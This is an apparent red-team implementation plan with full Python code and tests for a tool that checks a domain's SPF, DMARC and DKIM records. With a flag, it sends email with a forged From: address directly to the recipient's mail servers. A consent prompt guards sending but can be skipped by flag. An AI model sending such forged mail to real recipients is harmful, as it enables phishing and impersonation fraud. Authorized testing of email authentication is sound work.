# Email Spoof PoC Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build `email_spoof_poc.py`, a standalone tool that proves SPF/DMARC/DKIM weaknesses are exploitable — always emitting an analytical spoofing verdict, and optionally (opt-in, behind an RoE gate) delivering a forged email and capturing the SMTP transcript as evidence.

**Architecture:** Single top-level Python script reusing the DNS classification logic from `lib/email_security.py` (refactored into pure functions). The verdict engine maps DMARC/SPF status to an exploitability conclusion. The send path resolves the recipient MX, talks SMTP directly on port 25 (with relay fallback), and records the full transcript. Evidence is written as JSON + a transcript file.

**Tech Stack:** Python 3 stdlib only — `argparse`, `smtplib`, `email.message`, `subprocess` (`dig`, reused from `email_security.py`). Tests in `unittest` style (runnable via `pytest`), matching the existing suite.

**Design doc:** `docs/superpowers/specs/2026-05-28-email-spoof-poc-design.md`

---

## File Structure

- **Modify** `lib/email_security.py` — extract `classify_spf`, `classify_dmarc`, `classify_dkim`, and `analyze()` as pure/importable functions; add `policy` field to DMARC result; guard the CLI behind `main()` + `if __name__ == "__main__"`. Behavior unchanged when run as before.
- **Create** `email_spoof_poc.py` (top-level) — CLI, verdict engine, message builder, MX resolver, SMTP delivery (direct + relay), RoE gate, evidence writer.
- **Create** `test_email_spoof.py` (top-level) — unit tests for verdict matrix, message assembly, MX parsing, and delivery (with a fake SMTP), plus a dry-run smoke test.

---

## Task 1: Refactor `lib/email_security.py` into importable functions

**Files:**
- Modify: `lib/email_security.py`
- Test: `test_email_spoof.py`

- [ ] **Step 1: Write the failing test**

Create `test_email_spoof.py` with:

```python
#!/usr/bin/env python3
"""Unit tests for email_spoof_poc.py and the refactored email_security classifiers."""
import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))


class TestEmailSecurityClassifiers(unittest.TestCase):
    def test_classify_spf_missing(self):
        from email_security import classify_spf
        r = classify_spf([])
        self.assertEqual(r["status"], "MISSING")
        self.assertEqual(r["severity"], "high")

    def test_classify_spf_permissive(self):
        from email_security import classify_spf
        r = classify_spf(["v=spf1 +all"])
        self.assertEqual(r["status"], "PERMISSIVE")

    def test_classify_spf_ok(self):
        from email_security import classify_spf
        r = classify_spf(["v=spf1 include:_spf.google.com -all"])
        self.assertEqual(r["status"], "OK")

    def test_classify_dmarc_missing(self):
        from email_security import classify_dmarc
        r = classify_dmarc([], "example.com")
        self.assertEqual(r["status"], "MISSING")

    def test_classify_dmarc_none_exposes_policy(self):
        from email_security import classify_dmarc
        r = classify_dmarc(['v=DMARC1; p=none; rua=mailto:x@example.com'], "example.com")
        self.assertEqual(r["status"], "MONITOR_ONLY")
        self.assertEqual(r["policy"], "none")

    def test_classify_dmarc_reject_exposes_policy(self):
        from email_security import classify_dmarc
        r = classify_dmarc(['v=DMARC1; p=reject'], "example.com")
        self.assertEqual(r["status"], "OK")
        self.assertEqual(r["policy"], "reject")

    def test_classify_dkim_found(self):
        from email_security import classify_dkim
        self.assertEqual(classify_dkim(["google"])["status"], "OK")

    def test_classify_dkim_not_found(self):
        from email_security import classify_dkim
        self.assertEqual(classify_dkim([])["status"], "NOT_FOUND")


if __name__ == "__main__":
    unittest.main()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest test_email_spoof.py::TestEmailSecurityClassifiers -q`
Expected: FAIL with `ImportError: cannot import name 'classify_spf'` (functions don't exist yet).

- [ ] **Step 3: Refactor `lib/email_security.py`**

Replace the entire file body (keep the shebang/docstring) with the function-based version. The `dig` helper is unchanged. Classification logic is identical to the current inline code, just moved into pure functions; DMARC gains a `policy` field.

```python
#!/usr/bin/env python3
"""
email_security.py — SPF/DMARC/DKIM → email_security.json

Funções de classificação puras (importáveis) + CLI sob main().
"""
import subprocess, json, sys, re, os

DKIM_SELECTORS = ["default", "google", "mail", "k1", "s1", "s2", "email", "selector1", "selector2"]


def dig(record_type, name, short=True):
    cmd = ["dig", "+short", record_type, name] if short else ["dig", record_type, name]
    try:
        return subprocess.check_output(cmd, timeout=10, text=True).strip()
    except Exception:
        return ""


def classify_spf(spf_records):
    if not spf_records:
        return {"status": "MISSING", "severity": "high",
                "detail": "SPF record missing — any server can send email on behalf of the domain.",
                "recommendation": "Add a TXT SPF record, e.g. v=spf1 include:_spf.google.com ~all"}
    if any("+all" in r for r in spf_records):
        return {"status": "PERMISSIVE", "severity": "high",
                "detail": "SPF with '+all' allows ANY server to send email for the domain.",
                "value": spf_records[0],
                "recommendation": "Replace '+all' with '~all' (softfail) or '-all' (hardfail)."}
    if any("?all" in r for r in spf_records):
        return {"status": "NEUTRAL", "severity": "medium",
                "detail": "SPF with '?all' (neutral) does not block unauthorized senders.",
                "value": spf_records[0],
                "recommendation": "Replace '?all' with '~all' or '-all'."}
    qual = "softfail (~all)" if "~all" in spf_records[0] else "hardfail (-all)" if "-all" in spf_records[0] else "configured"
    return {"status": "OK", "severity": "none",
            "detail": f"SPF configured correctly ({qual}).",
            "value": spf_records[0]}


def classify_dmarc(dmarc_records, domain):
    if not dmarc_records:
        return {"status": "MISSING", "severity": "high",
                "detail": "DMARC record missing — no visibility or control over domain abuse.",
                "recommendation": "Adicione: _dmarc." + domain + " TXT \"v=DMARC1; p=quarantine; rua=mailto:dmarc@" + domain + "\""}
    dmarc = dmarc_records[0]
    policy_m = re.search(r'p=(none|quarantine|reject)', dmarc, re.IGNORECASE)
    policy = policy_m.group(1).lower() if policy_m else "unknown"
    if policy == "none":
        return {"status": "MONITOR_ONLY", "severity": "medium", "policy": policy,
                "detail": "DMARC with p=none only monitors — spoofed emails still reach recipients.",
                "value": dmarc,
                "recommendation": "Move to p=quarantine and then p=reject after validating reports."}
    if policy in ("quarantine", "reject"):
        return {"status": "OK", "severity": "none", "policy": policy,
                "detail": f"DMARC configured with p={policy}.",
                "value": dmarc}
    return {"status": "INVALID", "severity": "medium", "policy": policy,
            "detail": f"DMARC with invalid or unrecognized policy: {policy}",
            "value": dmarc,
            "recommendation": "Check the DMARC record syntax."}


def classify_dkim(dkim_found):
    if dkim_found:
        return {"status": "OK", "severity": "none",
                "detail": f"DKIM found for selectors: {', '.join(dkim_found)}"}
    return {"status": "NOT_FOUND", "severity": "low",
            "detail": "DKIM not detected on common selectors. It may be configured with a custom selector.",
            "recommendation": "Verify whether the email provider configured DKIM for the domain."}


def analyze(domain):
    """Resolve DNS e classifica SPF/DMARC/DKIM. Retorna o dict de resultados."""
    spf_raw = dig("TXT", domain)
    spf_records = [l for l in spf_raw.splitlines() if "v=spf1" in l.lower()]

    dmarc_raw = dig("TXT", f"_dmarc.{domain}")
    dmarc_records = [l for l in dmarc_raw.splitlines() if "v=dmarc1" in l.lower()]

    dkim_found = []
    for sel in DKIM_SELECTORS:
        r = dig("TXT", f"{sel}._domainkey.{domain}")
        if "v=dkim1" in r.lower() or "p=" in r:
            dkim_found.append(sel)

    return {
        "spf": classify_spf(spf_records),
        "dmarc": classify_dmarc(dmarc_records, domain),
        "dkim": classify_dkim(dkim_found),
    }


def main():
    domain = sys.argv[1]
    outdir = sys.argv[2]
    results = analyze(domain)

    with open(os.path.join(outdir, "raw", "email_security.json"), "w") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)

    issues = sum(1 for v in results.values() if v["severity"] in ("high", "medium"))
    print(f"  [{'!' if issues else '✓'}] SPF: {results['spf']['status']} | DMARC: {results['dmarc']['status']} | DKIM: {results['dkim']['status']}")
    if issues:
        print(f"  [!] {issues} problema(s) de segurança de email encontrado(s)")
        for key, val in results.items():
            if val["severity"] in ("high", "medium"):
                print(f"      • {key.upper()}: {val['detail']}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest test_email_spoof.py::TestEmailSecurityClassifiers -q`
Expected: PASS (8 tests).

- [ ] **Step 5: Verify the CLI still compiles and behaves**

Run: `python3 -m py_compile lib/email_security.py && echo COMPILE_OK`
Expected: `COMPILE_OK`

- [ ] **Step 6: Commit**

```bash
git add lib/email_security.py test_email_spoof.py
git commit -m "refactor(email): extrai classificadores puros de email_security.py"
```

---

## Task 2: Verdict engine in `email_spoof_poc.py`

**Files:**
- Create: `email_spoof_poc.py`
- Test: `test_email_spoof.py`

- [ ] **Step 1: Write the failing test**

Add to `test_email_spoof.py`:

```python
class TestVerdict(unittest.TestCase):
    def _records(self, spf_status="MISSING", dmarc_status="MISSING", dmarc_policy=None):
        return {
            "spf": {"status": spf_status, "severity": "high"},
            "dmarc": {"status": dmarc_status, "severity": "high", **({"policy": dmarc_policy} if dmarc_policy else {})},
            "dkim": {"status": "NOT_FOUND", "severity": "low"},
        }

    def test_verdict_missing_dmarc_is_inbox(self):
        import email_spoof_poc as esp
        v = esp.compute_verdict(self._records(dmarc_status="MISSING"), "x@example.com")
        self.assertEqual(v["status"], "SPOOFABLE_INBOX")

    def test_verdict_p_none_is_inbox(self):
        import email_spoof_poc as esp
        v = esp.compute_verdict(self._records(dmarc_status="MONITOR_ONLY", dmarc_policy="none"), "x@example.com")
        self.assertEqual(v["status"], "SPOOFABLE_INBOX")

    def test_verdict_quarantine_is_spam(self):
        import email_spoof_poc as esp
        v = esp.compute_verdict(self._records(dmarc_status="OK", dmarc_policy="quarantine"), "x@example.com")
        self.assertEqual(v["status"], "SPOOFABLE_SPAM")

    def test_verdict_reject_is_blocked(self):
        import email_spoof_poc as esp
        v = esp.compute_verdict(self._records(dmarc_status="OK", dmarc_policy="reject"), "x@example.com")
        self.assertEqual(v["status"], "BLOCKED_EXACT")

    def test_verdict_spf_note_present_when_weak(self):
        import email_spoof_poc as esp
        v = esp.compute_verdict(self._records(spf_status="MISSING", dmarc_status="MISSING"), "x@example.com")
        self.assertIsNotNone(v["spf_note_en"])

    def test_verdict_carries_forged_envelope(self):
        import email_spoof_poc as esp
        v = esp.compute_verdict(self._records(), "spoof@example.com")
        self.assertEqual(v["forged_envelope"]["header_from"], "spoof@example.com")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest test_email_spoof.py::TestVerdict -q`
Expected: FAIL with `ModuleNotFoundError: No module named 'email_spoof_poc'`.

- [ ] **Step 3: Create `email_spoof_poc.py` with the verdict engine**

```python
#!/usr/bin/env python3
"""
email_spoof_poc.py — Evidência de exploração de SPF/DMARC/DKIM.

Sempre emite um verdito analítico de spoofing. Com --send (opt-in, atrás de
gate RoE), entrega um email forjado e captura o transcript SMTP como prova.

Uso de red team autorizado (RoE assinado). Console PT-BR; campos de evidência
em EN (padrão deliverable do suite).
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))


def compute_verdict(records, forged_from):
    """Mapeia status DNS → verdito de exploitabilidade de spoofing de From:."""
    spf = records["spf"]
    dmarc = records["dmarc"]
    dmarc_status = dmarc.get("status")
    dmarc_policy = dmarc.get("policy")

    if dmarc_status == "MISSING" or dmarc_policy == "none":
        status = "SPOOFABLE_INBOX"
        impact = "Forged From: of the exact domain is delivered to the inbox (DMARC absent or p=none)."
    elif dmarc_policy == "quarantine":
        status = "SPOOFABLE_SPAM"
        impact = "Forged mail is accepted but likely quarantined/spam-foldered (DMARC p=quarantine)."
    elif dmarc_policy == "reject":
        status = "BLOCKED_EXACT"
        impact = "Exact-domain spoofing blocked by DMARC p=reject; lookalike/cousin domains remain viable."
    else:
        status = "INDETERMINATE"
        impact = "DMARC policy unrecognized; manual review required."

    spf_note = None
    if spf.get("status") in ("MISSING", "PERMISSIVE", "NEUTRAL"):
        spf_note = "Envelope sender (MAIL FROM) is unprotected — eases envelope spoofing and backscatter."

    return {
        "status": status,
        "impact_en": impact,
        "spf_note_en": spf_note,
        "forged_envelope": {"mail_from": forged_from, "header_from": forged_from},
    }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest test_email_spoof.py::TestVerdict -q`
Expected: PASS (6 tests).

- [ ] **Step 5: Commit**

```bash
git add email_spoof_poc.py test_email_spoof.py
git commit -m "feat(spoof): motor de verdito analítico de spoofing"
```

---

## Task 3: Forged message builder

**Files:**
- Modify: `email_spoof_poc.py`
- Test: `test_email_spoof.py`

- [ ] **Step 1: Write the failing test**

Add to `test_email_spoof.py`:

```python
class TestMessage(unittest.TestCase):
    def test_build_message_sets_forged_from(self):
        import email_spoof_poc as esp
        msg, msg_id = esp.build_message("ceo@target.com", "victim@corp.com", "Subj", "Body")
        self.assertEqual(msg["From"], "ceo@target.com")
        self.assertEqual(msg["To"], "victim@corp.com")
        self.assertEqual(msg["Subject"], "Subj")

    def test_build_message_returns_captured_message_id(self):
        import email_spoof_poc as esp
        msg, msg_id = esp.build_message("ceo@target.com", "victim@corp.com", "Subj", "Body")
        self.assertTrue(msg_id.startswith("<"))
        self.assertEqual(msg["Message-ID"], msg_id)

    def test_build_message_body_present(self):
        import email_spoof_poc as esp
        msg, _ = esp.build_message("a@b.com", "c@d.com", "S", "HELLO-BODY")
        self.assertIn("HELLO-BODY", msg.get_content())
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest test_email_spoof.py::TestMessage -q`
Expected: FAIL with `AttributeError: module 'email_spoof_poc' has no attribute 'build_message'`.

- [ ] **Step 3: Add `build_message` to `email_spoof_poc.py`**

Add the import at the top (next to the existing imports):

```python
import email.message
import email.utils
```

Add the function after `compute_verdict`:

```python
def build_message(forged_from, to_addr, subject, body):
    """Monta o email forjado. Retorna (EmailMessage, message_id capturado)."""
    msg = email.message.EmailMessage()
    msg["From"] = forged_from
    msg["To"] = to_addr
    msg["Subject"] = subject
    msg["Date"] = email.utils.formatdate(localtime=True)
    msg_id = email.utils.make_msgid()
    msg["Message-ID"] = msg_id
    msg.set_content(body)
    return msg, msg_id
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest test_email_spoof.py::TestMessage -q`
Expected: PASS (3 tests).

- [ ] **Step 5: Commit**

```bash
git add email_spoof_poc.py test_email_spoof.py
git commit -m "feat(spoof): construtor de mensagem forjada com captura de Message-ID"
```

---

## Task 4: MX resolution + SMTP delivery (direct + relay)

**Files:**
- Modify: `email_spoof_poc.py`
- Test: `test_email_spoof.py`

- [ ] **Step 1: Write the failing test**

Add to `test_email_spoof.py`:

```python
class FakeSMTP:
    """SMTP falso para testar a entrega sem rede. Registra comandos."""
    instances = []

    def __init__(self, host, port, timeout=15):
        self.host = host
        self.port = port
        self.commands = []
        FakeSMTP.instances.append(self)

    def ehlo(self, name=""):
        self.commands.append(("ehlo", name))
        return (250, b"ok")

    def mail(self, addr):
        self.commands.append(("mail", addr))
        return (250, b"sender ok")

    def rcpt(self, addr):
        self.commands.append(("rcpt", addr))
        return (250, b"recipient ok")

    def data(self, msg_bytes):
        self.commands.append(("data", len(msg_bytes)))
        return (250, b"queued as ABC123")

    def starttls(self):
        self.commands.append(("starttls", None))

    def login(self, user, password):
        self.commands.append(("login", user))

    def quit(self):
        self.commands.append(("quit", None))


class TestDelivery(unittest.TestCase):
    def setUp(self):
        FakeSMTP.instances = []

    def test_parse_mx_sorts_by_preference(self):
        import email_spoof_poc as esp
        hosts = esp.parse_mx("20 mx2.example.com.\n10 mx1.example.com.")
        self.assertEqual(hosts, ["mx1.example.com", "mx2.example.com"])

    def test_deliver_direct_accepts_on_250(self):
        import email_spoof_poc as esp
        result = esp.deliver_direct(["mx1.example.com"], "attacker.test",
                                    "ceo@target.com", "victim@corp.com", b"RAW",
                                    smtp_factory=FakeSMTP)
        self.assertTrue(result["accepted"])
        self.assertEqual(result["mx_used"], "mx1.example.com")
        self.assertEqual(result["method"], "direct")
        self.assertTrue(any("DATA" in line for line in result["transcript"]))

    def test_deliver_direct_tries_next_mx_on_failure(self):
        import email_spoof_poc as esp

        class FailFirst(FakeSMTP):
            def __init__(self, host, port, timeout=15):
                if host == "mx1.example.com":
                    raise OSError("connection refused")
                super().__init__(host, port, timeout)

        result = esp.deliver_direct(["mx1.example.com", "mx2.example.com"], "h",
                                    "a@b.com", "c@d.com", b"RAW", smtp_factory=FailFirst)
        self.assertTrue(result["accepted"])
        self.assertEqual(result["mx_used"], "mx2.example.com")

    def test_deliver_relay_authenticates_when_user_given(self):
        import email_spoof_poc as esp
        result = esp.deliver_relay("relay.test", 587, "user", "pass", "h",
                                   "a@b.com", "c@d.com", b"RAW", smtp_factory=FakeSMTP)
        self.assertTrue(result["accepted"])
        self.assertEqual(result["method"], "relay")
        inst = FakeSMTP.instances[-1]
        self.assertIn(("starttls", None), inst.commands)
        self.assertIn(("login", "user"), inst.commands)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest test_email_spoof.py::TestDelivery -q`
Expected: FAIL with `AttributeError: module 'email_spoof_poc' has no attribute 'parse_mx'`.

- [ ] **Step 3: Add MX + delivery functions to `email_spoof_poc.py`**

Add the import at the top:

```python
import smtplib
```

Add these functions after `build_message`:

```python
def parse_mx(dig_mx_output):
    """Parseia a saída de `dig +short MX` → lista de hosts ordenada por preferência."""
    hosts = []
    for line in dig_mx_output.splitlines():
        parts = line.split()
        if len(parts) == 2 and parts[0].isdigit():
            hosts.append((int(parts[0]), parts[1].rstrip(".")))
    hosts.sort()
    return [h for _, h in hosts]


def _decode(resp):
    return resp.decode(errors="replace") if isinstance(resp, (bytes, bytearray)) else str(resp)


def deliver_direct(mx_hosts, helo, mail_from, rcpt_to, msg_bytes,
                   timeout=15, smtp_factory=smtplib.SMTP):
    """Entrega direta na porta 25, tentando cada MX. Captura o transcript."""
    transcript = []
    last_err = None
    for host in mx_hosts:
        try:
            s = smtp_factory(host, 25, timeout=timeout)
            transcript.append(f"CONNECT {host}:25")
            code, resp = s.ehlo(helo)
            transcript.append(f"EHLO {helo} -> {code} {_decode(resp)}")
            code, resp = s.mail(mail_from)
            transcript.append(f"MAIL FROM:<{mail_from}> -> {code} {_decode(resp)}")
            code, resp = s.rcpt(rcpt_to)
            transcript.append(f"RCPT TO:<{rcpt_to}> -> {code} {_decode(resp)}")
            code, resp = s.data(msg_bytes)
            transcript.append(f"DATA -> {code} {_decode(resp)}")
            s.quit()
            return {"method": "direct", "mx_used": host, "accepted": code == 250,
                    "transcript": transcript}
        except Exception as e:
            transcript.append(f"ERROR {host}: {e}")
            last_err = e
            continue
    return {"method": "direct", "mx_used": None, "accepted": False,
            "transcript": transcript, "error": str(last_err) if last_err else None}


def deliver_relay(host, port, user, password, helo, mail_from, rcpt_to, msg_bytes,
                  timeout=15, smtp_factory=smtplib.SMTP):
    """Entrega via relay configurado (STARTTLS+login se user fornecido)."""
    transcript = []
    try:
        s = smtp_factory(host, port, timeout=timeout)
        transcript.append(f"CONNECT relay {host}:{port}")
        s.ehlo(helo)
        if user:
            s.starttls()
            s.ehlo(helo)
            s.login(user, password)
            transcript.append("STARTTLS + AUTH")
        code, resp = s.mail(mail_from)
        transcript.append(f"MAIL FROM:<{mail_from}> -> {code} {_decode(resp)}")
        code, resp = s.rcpt(rcpt_to)
        transcript.append(f"RCPT TO:<{rcpt_to}> -> {code} {_decode(resp)}")
        code, resp = s.data(msg_bytes)
        transcript.append(f"DATA -> {code} {_decode(resp)}")
        s.quit()
        return {"method": "relay", "mx_used": host, "accepted": code == 250,
                "transcript": transcript}
    except Exception as e:
        transcript.append(f"ERROR relay {host}: {e}")
        return {"method": "relay", "mx_used": None, "accepted": False,
                "transcript": transcript, "error": str(e)}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest test_email_spoof.py::TestDelivery -q`
Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add email_spoof_poc.py test_email_spoof.py
git commit -m "feat(spoof): resolução de MX + entrega SMTP direta/relay com transcript"
```

---

## Task 5: RoE gate, CLI wiring, and evidence output

**Files:**
- Modify: `email_spoof_poc.py`
- Test: `test_email_spoof.py`

- [ ] **Step 1: Write the failing test**

Add to `test_email_spoof.py`:

```python
class TestGateAndOutput(unittest.TestCase):
    def test_roe_gate_passes_with_assume_yes(self):
        import email_spoof_poc as esp
        self.assertTrue(esp.roe_gate("a@b.com", "c@d.com", "direct", assume_yes=True))

    def test_roe_gate_blocks_non_interactive_without_consent(self):
        import email_spoof_poc as esp
        # sem assume_yes e sem TTY → falha segura (não envia)
        self.assertFalse(esp.roe_gate("a@b.com", "c@d.com", "direct",
                                      assume_yes=False, interactive=False))

    def test_write_evidence_creates_json_and_transcript(self):
        import json
        import tempfile
        import email_spoof_poc as esp
        with tempfile.TemporaryDirectory() as d:
            records = {"spf": {"status": "MISSING", "severity": "high"},
                       "dmarc": {"status": "MISSING", "severity": "high"},
                       "dkim": {"status": "NOT_FOUND", "severity": "low"}}
            verdict = {"status": "SPOOFABLE_INBOX", "impact_en": "x",
                       "spf_note_en": None,
                       "forged_envelope": {"mail_from": "a@b.com", "header_from": "a@b.com"}}
            send = {"recipient": "c@d.com", "forged_from": "a@b.com", "mx_used": "mx1",
                    "delivery_method": "direct", "message_id": "<id>", "accepted": True,
                    "transcript": ["CONNECT mx1:25", "DATA -> 250 ok"]}
            esp.write_evidence(d, "example.com", records, verdict, send)
            with open(os.path.join(d, "spoof_evidence.json")) as f:
                data = json.load(f)
            self.assertEqual(data["verdict"]["status"], "SPOOFABLE_INBOX")
            self.assertEqual(data["send"]["accepted"], True)
            self.assertTrue(os.path.exists(os.path.join(d, "smtp_transcript.txt")))

    def test_write_evidence_without_send_omits_send_block(self):
        import json
        import tempfile
        import email_spoof_poc as esp
        with tempfile.TemporaryDirectory() as d:
            records = {"spf": {"status": "OK"}, "dmarc": {"status": "OK"}, "dkim": {"status": "OK"}}
            verdict = {"status": "BLOCKED_EXACT", "impact_en": "x", "spf_note_en": None,
                       "forged_envelope": {"mail_from": "a@b.com", "header_from": "a@b.com"}}
            esp.write_evidence(d, "example.com", records, verdict, None)
            with open(os.path.join(d, "spoof_evidence.json")) as f:
                data = json.load(f)
            self.assertNotIn("send", data)
            self.assertFalse(os.path.exists(os.path.join(d, "smtp_transcript.txt")))
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest test_email_spoof.py::TestGateAndOutput -q`
Expected: FAIL with `AttributeError: module 'email_spoof_poc' has no attribute 'roe_gate'`.

- [ ] **Step 3: Add gate, evidence writer, and CLI to `email_spoof_poc.py`**

Add the imports at the top:

```python
import json
import datetime
```

Add these functions after `deliver_relay`:

```python
def roe_gate(forged_from, to_addr, method, assume_yes=False, interactive=None):
    """Confirma autorização antes de enviar. Falha segura se sem consentimento."""
    if interactive is None:
        interactive = sys.stdin.isatty()
    print("\n  [RoE] ENVIO DE EMAIL FORJADO — uso autorizado apenas")
    print(f"        Remetente forjado : {forged_from}")
    print(f"        Destinatário      : {to_addr}")
    print(f"        Método            : {method}")
    if assume_yes:
        return True
    if not interactive:
        print("  [RoE] Sem confirmação e sem terminal interativo — abortando envio.")
        return False
    try:
        ans = input("  [RoE] Digite SIM para confirmar a autorização: ")
    except EOFError:
        return False
    return ans.strip() == "SIM"


def write_evidence(outdir, domain, records, verdict, send):
    """Grava spoof_evidence.json e (se houve envio) smtp_transcript.txt."""
    os.makedirs(outdir, exist_ok=True)
    evidence = {
        "domain": domain,
        "timestamp": datetime.datetime.now().isoformat(timespec="seconds"),
        "dns_records": records,
        "verdict": verdict,
    }
    if send is not None:
        transcript = send.get("transcript", [])
        evidence["send"] = {k: v for k, v in send.items() if k != "transcript"}
        evidence["send"]["smtp_transcript"] = transcript
        with open(os.path.join(outdir, "smtp_transcript.txt"), "w") as f:
            f.write("\n".join(transcript) + "\n")
    with open(os.path.join(outdir, "spoof_evidence.json"), "w") as f:
        json.dump(evidence, f, ensure_ascii=False, indent=2)
    return evidence


def _default_outdir(domain):
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    return f"spoof_poc_{domain}_{ts}"


def parse_args(argv=None):
    p = argparse.ArgumentParser(description="Evidência de exploração de SPF/DMARC/DKIM (red team autorizado).")
    p.add_argument("domain", help="Domínio alvo (domínio forjado em From:/MAIL FROM)")
    p.add_argument("--dry-run", action="store_true", help="Mostra o envelope/headers sem enviar")
    p.add_argument("--send", action="store_true", help="Ativa entrega forjada (opt-in, exige RoE)")
    p.add_argument("--to", help="Destinatário (obrigatório com --send)")
    p.add_argument("--from", dest="from_addr", help="Remetente forjado (default: security-test@<domain>)")
    p.add_argument("--subject", default="[AUTHORIZED SECURITY TEST] Email spoofing PoC")
    p.add_argument("--body", default="This is an authorized email spoofing proof-of-concept. No action required.")
    p.add_argument("--body-file", help="Lê o corpo de um arquivo")
    p.add_argument("--smtp", help="Relay de fallback HOST[:PORT]")
    p.add_argument("--smtp-user")
    p.add_argument("--smtp-pass")
    p.add_argument("--helo", default=None, help="Nome no EHLO/HELO (default: hostname local)")
    p.add_argument("--roe-accept", action="store_true", help="Confirma autorização sem prompt")
    p.add_argument("--no-roe", action="store_true", help="Pula o prompt RoE (CI)")
    p.add_argument("--outdir", default=None)
    return p.parse_args(argv)


def main(argv=None):
    import socket
    from email_security import analyze

    args = parse_args(argv)
    domain = args.domain
    forged_from = args.from_addr or f"security-test@{domain}"
    outdir = args.outdir or _default_outdir(domain)

    print(f"  [*] Analisando autenticação de email de {domain} ...")
    records = analyze(domain)
    verdict = compute_verdict(records, forged_from)

    print(f"  [=] SPF: {records['spf']['status']} | DMARC: {records['dmarc']['status']} | DKIM: {records['dkim']['status']}")
    print(f"  [VERDITO] {verdict['status']} — {verdict['impact_en']}")
    if verdict["spf_note_en"]:
        print(f"            SPF: {verdict['spf_note_en']}")
    print(f"  [envelope] MAIL FROM:<{forged_from}>  From: {forged_from}")

    send = None
    if args.send or args.dry_run:
        if not args.to:
            print("  [!] --to é obrigatório com --send/--dry-run.")
            return 2
        body = args.body
        if args.body_file:
            with open(args.body_file) as f:
                body = f.read()
        msg, msg_id = build_message(forged_from, args.to, args.subject, body)
        helo = args.helo or socket.getfqdn()

        if args.dry_run:
            print("\n  [DRY-RUN] Mensagem que SERIA enviada:")
            print("  " + "\n  ".join(msg.as_string().splitlines()))
            write_evidence(outdir, domain, records, verdict, None)
            print(f"\n  [✓] Evidência analítica em {outdir}/spoof_evidence.json")
            return 0

        method_desc = "direct-MX" + (" (fallback relay)" if args.smtp else "")
        if not roe_gate(forged_from, args.to, method_desc,
                        assume_yes=args.roe_accept or args.no_roe):
            return 1

        from email_security import dig
        recipient_domain = args.to.split("@", 1)[1]
        mx_hosts = parse_mx(dig("MX", recipient_domain))
        msg_bytes = msg.as_bytes()

        result = {"accepted": False, "transcript": ["sem MX resolvido"]}
        if mx_hosts:
            result = deliver_direct(mx_hosts, helo, forged_from, args.to, msg_bytes)
        if not result["accepted"] and args.smtp:
            print("  [→] Entrega direta falhou — tentando relay configurado ...")
            host, _, port = args.smtp.partition(":")
            result = deliver_relay(host, int(port) if port else 587,
                                   args.smtp_user, args.smtp_pass, helo,
                                   forged_from, args.to, msg_bytes)

        send = {
            "recipient": args.to,
            "forged_from": forged_from,
            "mx_used": result.get("mx_used"),
            "delivery_method": result.get("method", "direct"),
            "message_id": msg_id,
            "accepted": result["accepted"],
            "transcript": result["transcript"],
        }
        status = "ACEITO (250)" if result["accepted"] else "REJEITADO/FALHOU"
        print(f"  [SMTP] {status} via {send['delivery_method']} (mx={send['mx_used']})")

    write_evidence(outdir, domain, records, verdict, send)
    print(f"  [✓] Evidência em {outdir}/spoof_evidence.json")
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest test_email_spoof.py::TestGateAndOutput -q`
Expected: PASS (4 tests).

- [ ] **Step 5: Full test suite + compile + dry-run smoke**

Run:
```bash
python3 -m pytest test_email_spoof.py -q
python3 -m py_compile email_spoof_poc.py lib/email_security.py
python3 email_spoof_poc.py example.com --dry-run --to tester@gmail.com --no-roe
```
Expected: all tests PASS; `COMPILE_OK` (no output from py_compile = success); dry-run prints the verdict + the forged message and writes `spoof_poc_example.com_*/spoof_evidence.json` without sending.

- [ ] **Step 6: Commit**

```bash
git add email_spoof_poc.py test_email_spoof.py
git commit -m "feat(spoof): gate RoE, wiring da CLI e gravação de evidência"
```

---

## Self-Review Notes

- **Spec coverage:** §1 purpose → Task 2/5; §2 CLI → Task 5 `parse_args`; §3 verdict matrix → Task 2 `compute_verdict` (all 4 rows tested); §4 send flow → Task 4 (MX/direct/relay) + Task 5 (gate/wiring); §5 output JSON+transcript → Task 5 `write_evidence`; §6 safety (RoE, single recipient, dry-run, no IMAP) → Task 5; §7 tests → every task is TDD.
- **Type consistency:** `compute_verdict(records, forged_from)`, `build_message(...)→(msg, msg_id)`, `deliver_direct/relay(...)→{method,mx_used,accepted,transcript}`, `write_evidence(outdir, domain, records, verdict, send)` — names consistent across tasks.
- **Placeholders:** none — every code step is complete.
- **DMARC `policy` field:** introduced in Task 1, consumed by `compute_verdict` in Task 2 — ordering correct.
